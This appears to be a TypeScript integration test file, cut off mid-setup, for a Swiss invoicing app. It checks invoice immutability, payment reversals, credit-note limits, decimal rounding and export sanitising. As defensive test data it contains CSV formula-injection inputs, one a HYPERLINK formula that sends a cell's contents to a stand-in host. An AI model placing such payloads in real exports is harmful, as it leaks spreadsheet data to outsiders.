import { after, before, describe, it } from 'node:test';
import assert from 'node:assert/strict';

import { BASE_URL, data, del, get, post, requireServer } from '../helpers/client';
import { loginAll, type AccountName } from '../helpers/accounts';
import { lohnBelegeEntfernen, schutzfreiAufraeumen, testDb, testDbGrund, testDbSchliessen } from '../helpers/testdb';
import { zuercherHeute } from '../helpers/datum';
import { einsatzertragAlsPauschale } from '../../src/lib/money';
import { rechnungsSummen } from '../../src/lib/rechnungsbetraege';

/**
 * Wave 13 — Finanzbelege: Unveränderlichkeit in der Datenbank, Storno statt
 * Löschen, Gutschriften mit Obergrenze, lückenlose Nummern.
 *
 * Bis hierher stand „eine ausgestellte Rechnung wird nie geändert" nur im
 * Dienst. Diese Reihe prüft beides: den Weg über HTTP (der die Regeln
 * einhält) und den direkten Griff in die Datenbank (den die Trigger
 * verweigern).
 *
 * Die angelegten Belege tragen die Notiz „Prüfreihe Finanzbelege" und werden
 * vorher und nachher an den Triggern vorbei entfernt — die Anwendung und die
 * Datenbank lassen es zu Recht nicht zu. Die Kaskaden greifen unter
 * `replica` nicht; Positionen, Zahlungen und Gutschriften werden deshalb
 * ausdrücklich gelöscht.
 */

let jars: Record<AccountName, string>;
const MARKE = 'Prüfreihe Finanzbelege';
let kundeId = '';
let andereKundeId = '';

async function aufraeumen() {
  const db = testDb();
  if (!db) return;
  const rechnungen = await db.invoice.findMany({ where: { notes: { contains: MARKE } }, select: { id: true } });
  const ids = rechnungen.map((r) => r.id);
  if (ids.length === 0) return;
  const zahlungen = await db.payment.findMany({ where: { invoiceId: { in: ids } }, select: { amount: true, status: true } });
  await schutzfreiAufraeumen(async (tx) => {
    await tx.payment.deleteMany({ where: { invoiceId: { in: ids } } });
    await tx.creditNote.deleteMany({ where: { invoiceId: { in: ids } } });
    await tx.paymentReminder.deleteMany({ where: { invoiceId: { in: ids } } });
    await tx.invoiceItem.deleteMany({ where: { invoiceId: { in: ids } } });
    await tx.invoice.deleteMany({ where: { id: { in: ids } } });
  });
  // Eine nicht stornierte Zahlung aus einem abgebrochenen Lauf hat den Kundenwert erhöht.
  const offen = zahlungen.filter((z) => z.status === 'SUCCEEDED').reduce((s, z) => s + Number(z.amount), 0);
  if (offen > 0 && kundeId) await db.customer.update({ where: { id: kundeId }, data: { lifetimeValue: { decrement: offen } } });
}

async function rechnung(ausstellen: boolean, kunde = kundeId) {
  const antwort = await post<{ data: { id: string; number: string; status: string; grossTotal: string } }>(
    '/api/invoices',
    {
      customerId: kunde,
      notes: MARKE,
      items: [{ name: 'Unterhaltsreinigung', quantity: 2, unit: 'Std.', unitPrice: 50, vatRate: 8.1 }],
      issueImmediately: ausstellen,
    },
    { jar: jars.admin },
  );
  assert.equal(antwort.status, 201, JSON.stringify(antwort.payload));
  return data(antwort);
}

before(async () => {
  await requireServer();
  jars = await loginAll();
  assert.ok(testDb(), `kein Zugang zur Testdatenbank: ${testDbGrund()}`);
  const kunden = data(await get<{ data: { id: string }[] }>('/api/customers?pageSize=5', { jar: jars.admin }));
  kundeId = kunden[0]!.id;
  andereKundeId = kunden[1]!.id;
  await aufraeumen();
});

after(async () => {
  await aufraeumen();
  await testDbSchliessen();
});

describe('Ausgestellte Rechnungen sind in der Datenbank unveränderlich', () => {
  let ausgestellt: { id: string; number: string };

  it('lückenlose Nummern: zwei ausgestellte Rechnungen folgen unmittelbar aufeinander', async () => {
    const a = await rechnung(true);
    const b = await rechnung(true);
    assert.equal(a.status, 'ISSUED');
    const lauf = (n: string) => Number(n.split('-').at(-1));
    assert.equal(lauf(b.number), lauf(a.number) + 1, `${a.number} → ${b.number}`);
    ausgestellt = a;
  });

  it('Betrag, Empfänger und Nummer lassen sich nicht ändern', async () => {
    const db = testDb()!;
    await assert.rejects(db.invoice.update({ where: { id: ausgestellt.id }, data: { grossTotal: 1 } }), /unveränderlich/);
    await assert.rejects(db.invoice.update({ where: { id: ausgestellt.id }, data: { billToName: 'Jemand anders' } }), /unveränderlich/);
    await assert.rejects(db.invoice.update({ where: { id: ausgestellt.id }, data: { number: 'RE-0000-00000' } }), /unveränderlich/);
    await assert.rejects(db.invoice.update({ where: { id: ausgestellt.id }, data: { status: 'DRAFT' } }), /Entwurf/);
  });

  it('löschen — auch weich — ist ausgeschlossen', async () => {
    const db = testDb()!;
    await assert.rejects(db.invoice.delete({ where: { id: ausgestellt.id } }), /nicht gelöscht/);
    await assert.rejects(db.invoice.update({ where: { id: ausgestellt.id }, data: { deletedAt: new Date() } }), /nicht gelöscht/);
    const antwort = await del(`/api/invoices/${ausgestellt.id}`, { jar: jars.admin });
    assert.ok([409, 422].includes(antwort.status), `über HTTP abgewiesen (kam ${antwort.status})`);
  });

  it('die Positionen sind gesperrt, der Lebenslauf nicht', async () => {
    const db = testDb()!;
    const position = await db.invoiceItem.findFirst({ where: { invoiceId: ausgestellt.id }, select: { id: true } });
    await assert.rejects(db.invoiceItem.update({ where: { id: position!.id }, data: { unitPrice: 1 } }), /unveränderlich/);
    await assert.rejects(db.invoiceItem.delete({ where: { id: position!.id } }), /unveränderlich/);
    await assert.rejects(
      db.invoiceItem.create({ data: { invoiceId: ausgestellt.id, name: 'nachgeschoben', unitPrice: 1, netAmount: 1, vatAmount: 0, lineTotal: 1 } }),
      /unveränderlich/,
    );
    // Lebenslauf: Versand, Ansicht, interne Notiz bleiben änderbar.
    await db.invoice.update({ where: { id: ausgestellt.id }, data: { viewedAt: new Date(), notes: `${MARKE} — angesehen` } });
  });

  it('ein Entwurf bleibt frei bearbeitbar', async () => {
    const entwurf = await rechnung(false);
    const db = testDb()!;
    await db.invoice.update({ where: { id: entwurf.id }, data: { introText: 'Geändert' } });
    const position = await db.invoiceItem.findFirst({ where: { invoiceId: entwurf.id }, select: { id: true } });
    await db.invoiceItem.update({ where: { id: position!.id }, data: { description: 'frei' } });
  });
});

/**
 * Geld wird dezimal gerechnet, nicht binär (2026-09-27).
 *
 * `computeInvoiceTotals` rechnete in `number` und rundete mit
 * `Math.round((x + EPSILON) * 100) / 100`. 1.5 Std. × CHF 12.35 sind 18.525 —
 * binär 18.52499999…, und die Position stand mit 18.52 statt 18.53 auf der
 * Rechnung. `EPSILON` ist für Beträge dieser Grösse zu klein, um das
 * aufzufangen.
 */
describe('Rechnungsbeträge: dezimal, kaufmännisch gerundet', () => {
  it('1.5 Std. × 12.35 ergibt 18.53, nicht 18.52 — Position, Summen, MWST', async () => {
    const antwort = await post<{ data: { id: string } }>(
      '/api/invoices',
      { customerId: kundeId, notes: MARKE, items: [{ name: 'Unterhaltsreinigung', quantity: 1.5, unit: 'Std.', unitPrice: 12.35, vatRate: 8.1 }], issueImmediately: false },
      { jar: jars.admin },
    );
    assert.equal(antwort.status, 201, antwort.text);
    const r = await testDb()!.invoice.findUniqueOrThrow({ where: { id: data(antwort).id }, include: { items: true } });
    assert.equal(r.items[0]!.netAmount.toString(), '18.53', 'Positionsbetrag');
    assert.equal(r.netTotal.toString(), '18.53', 'Nettosumme');
    // 18.53 × 8.1 % = 1.50093 → 1.50; brutto 20.03.
    assert.equal(r.vatAmount.toString(), '1.5');
    assert.equal(r.grossTotal.toString(), '20.03');
  });
});

describe('Zahlungen: Storno statt Löschen', () => {
  let rechnungId = '';
  let zahlungId = '';

  it('eine verbuchte Zahlung behält Betrag und wird nicht gelöscht', async () => {
    const r = await rechnung(true);
    rechnungId = r.id;
    const z = await post('/api/invoices/' + r.id + '/payments', { amount: 50, reference: MARKE }, { jar: jars.admin });
    assert.ok([200, 201].includes(z.status), JSON.stringify(z.payload));
    const db = testDb()!;
    const zeile = await db.payment.findFirst({ where: { invoiceId: r.id }, select: { id: true } });
    zahlungId = zeile!.id;
    await assert.rejects(db.payment.update({ where: { id: zahlungId }, data: { amount: 999 } }), /behält Betrag/);
    await assert.rejects(db.payment.delete({ where: { id: zahlungId } }), /nicht gelöscht/);
  });

  it('der Storno lässt die Zeile stehen und setzt Saldo, bezahlten Betrag und Kundenwert zurück', async () => {
    const db = testDb()!;
    const wertVorher = Number((await db.customer.findUnique({ where: { id: kundeId }, select: { lifetimeValue: true } }))!.lifetimeValue);
    const storno = await del(`/api/payments/${zahlungId}`, { jar: jars.admin });
    assert.equal(storno.status, 204, storno.text);
    const zeile = await db.payment.findUnique({ where: { id: zahlungId }, select: { status: true } });
    assert.equal(zeile?.status, 'CANCELLED', 'die Zahlung bleibt als Beleg');
    const r = await db.invoice.findUnique({ where: { id: rechnungId }, select: { balance: true, paidAmount: true, grossTotal: true, status: true } });
    assert.equal(Number(r!.balance), Number(r!.grossTotal));
    assert.equal(Number(r!.paidAmount), 0);
    // Zurück auf den Stand vor dem Geld. Die Rechnung wurde ausgestellt, aber
    // nie versendet — bis Wave 24 hiess es hier pauschal `SENT`.
    assert.equal(r!.status, 'ISSUED');
    const wertNachher = Number((await db.customer.findUnique({ where: { id: kundeId }, select: { lifetimeValue: true } }))!.lifetimeValue);
    assert.equal(Math.round((wertVorher - wertNachher) * 100) / 100, 50);
    assert.equal((await del(`/api/payments/${zahlungId}`, { jar: jars.admin })).status, 422, 'ein zweiter Storno');
    await assert.rejects(db.payment.update({ where: { id: zahlungId }, data: { status: 'SUCCEEDED' } }), /wiederbelebt/);
  });
});

describe('Gutschriften', () => {
  let rechnungId = '';
  let gross = 0;

  it('Storno einer teilweise bezahlten Rechnung verweist auf die Gutschrift — und die lässt sich jetzt erstellen', async () => {
    const r = await rechnung(true);
    rechnungId = r.id;
    // Die Summen stehen nach dem Anlegen in der Datenbank, nicht zwingend in der Antwort.
    gross = Number((await testDb()!.invoice.findUnique({ where: { id: r.id }, select: { grossTotal: true } }))!.grossTotal);
    assert.equal(gross, 108.1, '2 × 50 + 8,1 % MWST');
    await post('/api/invoices/' + r.id + '/payments', { amount: 20, reference: MARKE }, { jar: jars.admin });
    const storno = await post(`/api/invoices/${r.id}/cancel`, { reason: 'Prüfreihe' }, { jar: jars.admin });
    assert.equal(storno.status, 422);
    assert.ok(storno.text.includes('Gutschrift'));

    const g = await post<{ data: { id: string; number: string; grossTotal: string } }>(
      `/api/invoices/${r.id}/credit-note`,
      { reason: 'Einsatz verspätet', name: 'Kulanz', unitPrice: 30, vatRate: 8.1 },
      { jar: jars.admin },
    );
    assert.equal(g.status, 201, JSON.stringify(g.payload));
    assert.equal(Number(data(g).grossTotal), 32.43);
    const db = testDb()!;
    const nach = await db.invoice.findUnique({ where: { id: r.id }, select: { balance: true } });
    assert.equal(Number(nach!.balance), Math.round((gross - 20 - 32.43) * 100) / 100, 'der offene Posten sinkt um die Gutschrift');
    const pdf = await fetch(`${BASE_URL}/api/credit-notes/${data(g).id}/pdf`, { headers: { cookie: jars.admin } });
    assert.equal(pdf.status, 200);
    assert.equal(Buffer.from(await pdf.arrayBuffer()).subarray(0, 4).toString(), '%PDF');
    await assert.rejects(db.creditNote.update({ where: { id: data(g).id }, data: { grossTotal: 1 } }), /unveränderlich/);
    await assert.rejects(db.creditNote.delete({ where: { id: data(g).id } }), /nicht gelöscht/);
  });

  /**
   * Wave 24: Verbuchen und Storno rechneten den Saldo als `Brutto − bezahlt`
   * und vergassen die Gutschrift. Wer nach der Gutschrift den Rest bezahlte,
   * behielt einen offenen Posten in Höhe der Gutschrift und wurde gemahnt.
   */
  it('Rest nach einer Gutschrift bezahlen ergibt „bezahlt", der Storno danach berücksichtigt die Gutschrift', async () => {
    const db = testDb()!;
    const rest = Math.round((gross - 20 - 32.43) * 100) / 100;
    const zahlung = await post('/api/invoices/' + rechnungId + '/payments', { amount: rest, reference: MARKE }, { jar: jars.admin });
    assert.ok([200, 201].includes(zahlung.status), JSON.stringify(zahlung.payload));
    const bezahlt = await db.invoice.findUniqueOrThrow({ where: { id: rechnungId }, select: { balance: true, paidAmount: true, status: true } });
    assert.equal(Number(bezahlt.balance), 0, 'kein Saldo in Höhe der Gutschrift');
    assert.equal(bezahlt.status, 'PAID');
    assert.equal(Number(bezahlt.paidAmount), Math.round((20 + rest) * 100) / 100);

    const letzte = await db.payment.findFirstOrThrow({ where: { invoiceId: rechnungId, status: 'SUCCEEDED' }, orderBy: { createdAt: 'desc' }, select: { id: true } });
    assert.equal((await del(`/api/payments/${letzte.id}`, { jar: jars.admin })).status, 204);
    const zurueck = await db.invoice.findUniqueOrThrow({ where: { id: rechnungId }, select: { balance: true, paidAmount: true, status: true } });
    assert.equal(Number(zurueck.balance), rest, 'offen ist der Rest, nicht Rest plus Gutschrift');
    assert.equal(Number(zurueck.paidAmount), 20);
    assert.equal(zurueck.status, 'PARTIALLY_PAID');
  });

  it('nie mehr gutschreiben, als die Rechnung betrug', async () => {
    const zuviel = await post(`/api/invoices/${rechnungId}/credit-note`, { reason: 'zu viel', name: 'Zu viel', unitPrice: gross, vatRate: 8.1 }, { jar: jars.admin });
    assert.equal(zuviel.status, 422);
    assert.ok(zuviel.text.includes('chstens noch CHF'), zuviel.text);
  });

  it('nicht auf Entwürfe, nicht an eine fremde Kundschaft', async () => {
    const entwurf = await rechnung(false);
    const aufEntwurf = await post(`/api/invoices/${entwurf.id}/credit-note`, { reason: 'Entwurf', name: 'Kulanz', unitPrice: 1 }, { jar: jars.admin });
    assert.equal(aufEntwurf.status, 422);
    assert.ok(aufEntwurf.text.includes('ausgestellte'), aufEntwurf.text);
    const fremd = await post(
      '/api/credit-notes',
      { customerId: andereKundeId, invoiceId: rechnungId, reason: 'falsche Kundschaft', items: [{ name: 'Kulanz', unitPrice: 1 }] },
      { jar: jars.admin },
    );
    assert.equal(fremd.status, 422);
    assert.ok(fremd.text.includes('Kundschaft der Rechnung'), fremd.text);
  });

  it('Rollen: Betriebsleitung ja, Mitarbeitende und Kundschaft nein', async () => {
    assert.equal((await get('/api/credit-notes', { jar: jars.manager })).status, 200);
    for (const rolle of ['employee', 'customer'] as AccountName[]) {
      assert.equal((await get('/api/credit-notes', { jar: jars[rolle] })).status, 403, rolle);
    }
  });
});

/**
 * Rechnungsdatum und Fälligkeit in Zürcher Kalendertagen (2026-09-27).
 *
 * Der Befund: Ein Entwurf behielt beim Ausstellen sein altes Datum. Ein
 * Entwurf vom Monatsanfang, am Monatsende ausgestellt, trug das Datum vom
 * Monatsanfang, war beim Versand schon fällig und zog seine Nummer aus dem
 * Kreis dieses Datums.
 *
 * Die zweite Prüfung hält eine Regel fest, die schon galt: Der Mahnlauf
 * verglich `dueDate` (ein `@db.Date`) mit dem aktuellen Zeitpunkt; Prisma
 * kürzt den Vergleichswert dabei auf den UTC-Tag, also „fällig vor heute".
 * Der Dienst sagt das seither ausdrücklich mit dem Zürcher Tag — die Prüfung
 * verhindert, dass ein späterer Umbau auf einen echten Zeitpunktvergleich
 * Rechnungen am Fälligkeitstag selbst mahnt.
 */
describe('Rechnungsdatum und Fälligkeit: Zürcher Tage', () => {
  const tag = (versatz: number) => new Date(zuercherHeute().getTime() + versatz * 86_400_000).toISOString().slice(0, 10);

  it('ausgestellt wird auf den Ausstellungstag — die Zahlungsfrist wandert mit', async () => {
    const entwurf = await post<{ data: { id: string } }>(
      '/api/invoices',
      { customerId: kundeId, notes: MARKE, issueDate: tag(-10), dueDate: tag(20), items: [{ name: 'Unterhaltsreinigung', quantity: 1, unitPrice: 80, vatRate: 8.1 }], issueImmediately: false },
      { jar: jars.admin },
    );
    assert.equal(entwurf.status, 201, entwurf.text);
    const id = data(entwurf).id;
    assert.equal((await post(`/api/invoices/${id}/issue`, undefined, { jar: jars.admin })).status, 200);
    const r = await testDb()!.invoice.findUniqueOrThrow({ where: { id } });
    assert.equal(r.issueDate.toISOString().slice(0, 10), tag(0), 'das Rechnungsdatum ist der Tag der Ausstellung');
    assert.equal(r.dueDate.toISOString().slice(0, 10), tag(30), 'die Frist von 30 Tagen zählt ab der Ausstellung');
  });

  it('der Buchhaltungsexport enthält die Zahlungen des letzten Tages im Zeitraum', async () => {
    // `paidAt` ist ein Zeitpunkt; der Export filterte bis UTC-Mitternacht
    // *des* letzten Tages und liess dessen Zahlungen fast alle weg. Eine
    // Zahlung von jetzt, exportiert für den Zeitraum „heute bis heute", muss
    // darin stehen.
    const r = await rechnung(true);
    const zahlung = await post(`/api/invoices/${r.id}/payments`, { amount: 12.34, method: 'BANK_TRANSFER' }, { jar: jars.admin });
    assert.equal(zahlung.status, 201, zahlung.text);
    const antwort = await fetch(`${BASE_URL}/api/exports/buchhaltung`, {
      method: 'POST',
      headers: { cookie: jars.admin, 'content-type': 'application/json' },
      body: JSON.stringify({ format: 'csv', periodFrom: tag(0), periodTo: tag(0), include: ['payments'] }),
    });
    assert.equal(antwort.status, 200);
    const text = await antwort.text();
    assert.ok(text.includes(r.number) && text.includes('12.34'), `die Zahlung von heute fehlt im Export für heute:\n${text.slice(0, 400)}`);
  });

  it('am Fälligkeitstag selbst ist eine Rechnung noch nicht überfällig', async () => {
    const antwort = await post<{ data: { id: string } }>(
      '/api/invoices',
      { customerId: kundeId, notes: MARKE, issueDate: tag(0), dueDate: tag(0), items: [{ name: 'Unterhaltsreinigung', quantity: 1, unitPrice: 60, vatRate: 8.1 }], issueImmediately: true },
      { jar: jars.admin },
    );
    assert.equal(antwort.status, 201, antwort.text);
    const id = data(antwort).id;
    const lauf = await get('/api/cron/daily', { headers: { authorization: `Bearer ${process.env.CRON_SECRET ?? 'dev-cron-secret'}` } });
    assert.equal(lauf.status, 200, lauf.text.slice(0, 300));
    const r = await testDb()!.invoice.findUniqueOrThrow({ where: { id } });
    assert.notEqual(r.status, 'OVERDUE', 'am Fälligkeitstag als überfällig markiert');
    assert.equal(await testDb()!.paymentReminder.count({ where: { invoiceId: id } }), 0, 'am Fälligkeitstag gemahnt');
  });
});

/**
 * Ausgaben: Export und Belege (2026-09-27).
 *
 * Zwei Befunde, beide an echten Wegen geprüft:
 *
 *  • Der Buchhaltungsexport schrieb Freitext — Beschreibung, Beleg — roh in
 *    die CSV. Eine Beschreibung `=HYPERLINK(…)` ist in Excel und LibreOffice
 *    eine Formel (CSV/Formula Injection). Jetzt beginnt eine solche Zelle mit
 *    einem Apostroph; negative Beträge bleiben unberührt.
 *  • Die Ausgabe band jede Datei der Organisation als Beleg und schrieb
 *    ihren Zweck um — eine Lohnabrechnung wurde zum Beleg und für jede Rolle
 *    mit `expense:read` lesbar.
 */
describe('Ausgaben: Formeln im Export, fremde Dateien als Beleg', () => {
  const MARKE_AUSGABE = `Prüfreihe Ausgabe ${Date.now()}`;
  let lohnDatei = '';

  before(async () => {
    const db = testDb();
    if (!db) return;
    const org = (await db.organization.findFirstOrThrow({ where: { slug: 'clenaris' }, select: { id: true } })).id;
    lohnDatei = (
      await db.fileAsset.create({
        data: { organizationId: org, scope: 'PAYROLL', scanStatus: 'CLEAN', checksum: 'b'.repeat(64), path: 'pruef/lohn.pdf', url: 'pruef/lohn.pdf', filename: `${MARKE_AUSGABE}.pdf`, mimeType: 'application/pdf', sizeBytes: 10, provenance: 'SYSTEM_GENERATED' },
      })
    ).id;
  });

  after(async () => {
    const db = testDb();
    if (!db) return;
    await db.fileAsset.deleteMany({ where: { filename: { startsWith: 'Prüfreihe Ausgabe' } } });
    await db.expense.deleteMany({ where: { OR: [{ description: { contains: 'HYPERLINK' } }, { notes: { startsWith: 'Prüfreihe Ausgabe' } }] } });
  });

  it('csvZelle: Formelanfänge entschärft, Zahlen und Text unberührt', async () => {
    const { csvZelle } = await import('../../src/lib/csv');
    assert.equal(csvZelle('=1+1'), "'=1+1");
    assert.equal(csvZelle('+41 79 000 00 00'), "'+41 79 000 00 00");
    assert.equal(csvZelle('@SUM(A1)'), "'@SUM(A1)");
    assert.equal(csvZelle('\t=cmd'), "'\t=cmd");
    assert.equal(csvZelle('-12.50'), '-12.50', 'ein negativer Betrag ist keine Formel');
    assert.equal(csvZelle('Reinigung'), 'Reinigung');
    assert.equal(csvZelle('a;b'), '"a;b"');
    assert.equal(csvZelle('=HYPERLINK("x")'), `"'=HYPERLINK(""x"")"`);
  });

  it('der Buchhaltungsexport enthält keine Zelle, die mit einer Formel beginnt', async () => {
    const heute = zuercherHeute().toISOString().slice(0, 10);
    const ausgabe = await post(
      '/api/expenses',
      { description: '=HYPERLINK("https://boese.pruef.invalid/?"&A1,"Beleg")', reference: '+SUMME(A1)', expenseDate: heute, netAmount: 10, notes: MARKE_AUSGABE },
      { jar: jars.admin },
    );
    assert.equal(ausgabe.status, 201, ausgabe.text);

    const antwort = await fetch(`${BASE_URL}/api/exports/buchhaltung`, {
      method: 'POST',
      headers: { cookie: jars.admin, 'content-type': 'application/json' },
      body: JSON.stringify({ format: 'csv', periodFrom: heute, periodTo: heute, include: ['expenses'] }),
    });
    assert.equal(antwort.status, 200);
    const text = (await antwort.text()).replace(/^﻿/, '');
    assert.ok(text.includes("'=HYPERLINK"), 'die Formel steht entschärft im Export');
    for (const zeile of text.split(/\r?\n/)) {
      for (const zelle of zeile.split(';')) {
        const inhalt = zelle.replace(/^"/, '');
        assert.ok(!/^[=+@]/.test(inhalt), `Zelle beginnt mit einer Formel: ${inhalt.slice(0, 40)}`);
      }
    }
  });

  it('eine fremde Datei (Lohnabrechnung) lässt sich nicht als Beleg anhängen — und bleibt, was sie war', async (t) => {
    const db = testDb();
    if (!db) return t.skip('keine Testdatenbank');
    const r = await post(
      '/api/expenses',
      { description: 'Beleg mit fremder Datei', expenseDate: zuercherHeute().toISOString().slice(0, 10), netAmount: 5, notes: MARKE_AUSGABE, fileIds: [lohnDatei] },
      { jar: jars.manager },
    );
    assert.equal(r.status, 404, r.text);
    const datei = await db.fileAsset.findUniqueOrThrow({ where: { id: lohnDatei } });
    assert.equal(datei.scope, 'PAYROLL', 'Zweck umgeschrieben');
    assert.equal(datei.expenseId, null, 'an eine Ausgabe gebunden');
    assert.equal(await db.expense.count({ where: { description: 'Beleg mit fremder Datei', notes: MARKE_AUSGABE } }), 0, 'die Ausgabe entstand trotzdem');
  });

  it('dieselbe Datei lässt sich auch nicht als Nachrichtenanhang binden — die Antwort scheitert ganz', async () => {
    // Die Antwortroute band Dateien früher per `updateMany` mit nur
    // Hochladende und `messageId: null` im Filter; eine Kennung, die nicht
    // passte, fiel still weg. Jetzt teilt sie `dateienBinden` mit Buchung und
    // Beleg, und die Nachricht entsteht nicht ohne ihren Anhang.
    const db = testDb();
    assert.ok(db && lohnDatei);
    const verlauf = data(
      await post<{ data: { id: string } }>('/api/messages', { subject: MARKE_AUSGABE, body: 'Eröffnung' }, { jar: jars.customer }),
    );
    try {
      const r = await post(`/api/messages/${verlauf.id}`, { body: 'mit Anhang', fileIds: [lohnDatei] }, { jar: jars.customer });
      assert.equal(r.status, 404, r.text);
      const datei = await db.fileAsset.findUniqueOrThrow({ where: { id: lohnDatei } });
      assert.equal(datei.messageId, null, 'an eine Nachricht gebunden');
      assert.equal(await db.message.count({ where: { threadId: verlauf.id } }), 1, 'die Antwort entstand trotzdem');
    } finally {
      await db.message.deleteMany({ where: { threadId: verlauf.id } });
      await db.messageThread.delete({ where: { id: verlauf.id } });
    }
  });
});

/**
 * Verrechnet wird, was vereinbart ist — dezimal (2026-09-27, Befund N-03).
 *
 *  • **Einsatz ohne Buchung.** `createInvoiceFromJobs` rechnete Menge =
 *    Stunden, Einzelpreis = Ertrag / max(Stunden, 0.5). Unter 30 Minuten kam
 *    ein Bruchteil des Ertrags auf die Rechnung: 20 Minuten mit Ertrag 100
 *    ergaben 0.33 × 200 = 66. Der Zweig ist über HTTP heute nicht erreichbar
 *    (`POST /api/bookings/:id/invoice` verrechnet nur Einsätze *mit* Buchung);
 *    geprüft wird deshalb die Regel selbst, die der Dienst benutzt, und zwar
 *    zusammen mit der Summenrechnung, durch die jede Rechnungszeile läuft.
 *  • **Offerte.** `computeQuoteTotals` rechnete in `number`: 1.5 × 30.15
 *    ergab 45.22 statt 45.23. Geprüft über den echten Weg, `POST /api/quotes`.
 */
describe('Verrechnung: Einsatz ohne Buchung und Offerte, dezimal', () => {
  const MARKE_OFFERTE = `${MARKE} Offerte`;

  async function offertenAufraeumen() {
    const db = testDb();
    if (!db) return;
    const offerten = await db.quote.findMany({ where: { title: { startsWith: MARKE_OFFERTE } }, select: { id: true, deletedAt: true } });
    for (const offerte of offerten) {
      if (!offerte.deletedAt) await del(`/api/quotes/${offerte.id}`, { jar: jars.admin }).catch(() => undefined);
    }
    const ids = offerten.map((o) => o.id);
    if (ids.length === 0) return;
    await db.publicAccessToken.deleteMany({ where: { resourceId: { in: ids } } });
    // Wie `protokollpflicht.test.ts`: hängt doch noch etwas daran, bleibt die
    // Offerte im Papierkorb — ein Rest, kein Fehlschlag.
    await db.quote.deleteMany({ where: { id: { in: ids } } }).catch(() => undefined);
  }

  before(offertenAufraeumen);
  after(offertenAufraeumen);

  it('Einsatz ohne Buchung unter 30 Minuten: verrechnet wird der Ertrag, nicht zwei Drittel davon', () => {
    for (const [minuten, ertrag] of [
      [20, 100],
      [7, 45.5],
      [29, 80],
      [50, 199.99],
      [95, 123.45],
    ] as const) {
      const zeile = einsatzertragAlsPauschale(ertrag, minuten);
      const summen = rechnungsSummen([{ ...zeile, discount: 0, vatRate: 8.1 }]);
      assert.equal(summen.netTotal, ertrag, `${minuten} Minuten, Ertrag ${ertrag}: verrechnet ${summen.netTotal}`);
    }
    // Die Dauer bleibt als Auskunft für den Zeilentext erhalten.
    assert.equal(einsatzertragAlsPauschale(100, 20).stunden, 0.33);
    assert.equal(einsatzertragAlsPauschale(100, 90).stunden, 1.5);
  });

  it('Offerte: 1.5 Std. × 30.15 ergibt 45.23, nicht 45.22 — und MWST je Position wie auf der Rechnung', async () => {
    const gueltigBis = new Date(zuercherHeute().getTime() + 30 * 86_400_000).toISOString().slice(0, 10);
    const antwort = await post<{ data: { id: string } }>(
      '/api/quotes',
      {
        customerId: kundeId,
        title: `${MARKE_OFFERTE} ${Date.now()}`,
        validUntil: gueltigBis,
        items: [
          { name: 'Unterhaltsreinigung', quantity: 1.5, unit: 'Std.', unitPrice: 30.15, discount: 0, vatRate: 8.1, optional: false },
          // Optional: steht mit Betrag in der Offerte, zählt aber nicht zum Total.
          { name: 'Fenster zusätzlich', quantity: 1, unit: 'Pauschal', unitPrice: 99.95, discount: 0, vatRate: 8.1, optional: true },
        ],
        discountValue: 0,
      },
      { jar: jars.admin },
    );
    assert.equal(antwort.status, 201, antwort.text);
    const q = await testDb()!.quote.findUniqueOrThrow({ where: { id: data(antwort).id }, include: { items: { orderBy: { position: 'asc' } } } });
    assert.equal(q.items[0]!.lineTotal.toString(), '45.23', 'Positionsbetrag');
    assert.equal(q.items[1]!.lineTotal.toString(), '99.95', 'die optionale Position trägt ihren Betrag');
    assert.equal(q.subtotal.toString(), '45.23', 'Zwischentotal ohne optionale Position');
    // 45.23 × 8.1 % = 3.66363 → 3.66; brutto 48.89.
    assert.equal(q.vatAmount.toString(), '3.66');
    assert.equal(q.grossTotal.toString(), '48.89');
    // Dieselben Positionen als Rechnung gerechnet ergeben dasselbe Total —
    // die Rechnung aus einer Offerte ist die Offerte.
    const alsRechnung = rechnungsSummen([{ quantity: 1.5, unitPrice: 30.15, discount: 0, vatRate: 8.1 }]);
    assert.equal(alsRechnung.grossTotal, Number(q.grossTotal));
  });
});

/**
 * Beleg und Protokollzeile entstehen gemeinsam oder gar nicht (2026-09-27,
 * Befund F-14).
 *
 * Rechnung ausstellen, Zahlung erfassen und Lohnabrechnung veröffentlichen
 * schrieben ihr Protokoll nach dem Commit über `recordAudit`, das jeden Fehler
 * verschluckt. Ob eine Zeile *vorhanden* ist, prüft `protokollpflicht.test.ts`;
 * hier geht es um die andere Hälfte: Lässt sich die Zeile nicht schreiben,
 * darf auch der Beleg nicht entstehen. Eine Sperre auf `audit_logs` (ein
 * Prüf-Trigger, der nur die Kennungen dieser Reihe trifft) macht das
 * beobachtbar — gegen den alten Stand gelingt die Handlung trotz Sperre, und
 * der Beleg steht ohne Zeile da.
 */
describe('Beleg und Protokollzeile in einer Transaktion', () => {
  const SPERRE = 'pruef_sperre_finanzbelege';
  const LOHN_JAHR = 2019;
  const LOHN_MONAT = 3;
  let mitarbeiterId = '';

  async function sperren(entityId: string) {
    await testDb()!.$executeRawUnsafe(`INSERT INTO ${SPERRE} ("entityId") VALUES ($1) ON CONFLICT DO NOTHING`, entityId);
  }
  async function entsperren(entityId: string) {
    await testDb()!.$executeRawUnsafe(`DELETE FROM ${SPERRE} WHERE "entityId" = $1`, entityId);
  }

  async function lohnAufraeumen() {
    const db = testDb();
    if (!db || !mitarbeiterId) return;
    const abrechnungen = await db.payslip.findMany({ where: { employeeId: mitarbeiterId, year: LOHN_JAHR, month: LOHN_MONAT }, select: { id: true } });
    const ids = abrechnungen.map((a) => a.id);
    if (ids.length === 0) return;
    const waisen = await db.fileAsset.findMany({ where: { OR: ids.map((id) => ({ path: { contains: `/payroll/payslips/${id}` } })) }, select: { id: true } });
    await schutzfreiAufraeumen(async (tx) => {
      await lohnBelegeEntfernen(tx, ids);
      await tx.fileAsset.deleteMany({ where: { id: { in: waisen.map((w) => w.id) } } });
    });
  }

  before(async () => {
    const db = testDb()!;
    await db.$executeRawUnsafe(`CREATE TABLE IF NOT EXISTS ${SPERRE} ("entityId" text PRIMARY KEY)`);
    await db.$executeRawUnsafe(
      `CREATE OR REPLACE FUNCTION ${SPERRE}() RETURNS trigger LANGUAGE plpgsql AS $$
       BEGIN
         IF EXISTS (SELECT 1 FROM ${SPERRE} s WHERE s."entityId" = NEW."entityId") THEN
           RAISE EXCEPTION 'Prüfreihe Finanzbelege: Protokoll gesperrt' USING ERRCODE = 'P0001';
         END IF;
         RETURN NEW;
       END $$`,
    );
    await db.$executeRawUnsafe(`DROP TRIGGER IF EXISTS ${SPERRE} ON audit_logs`);
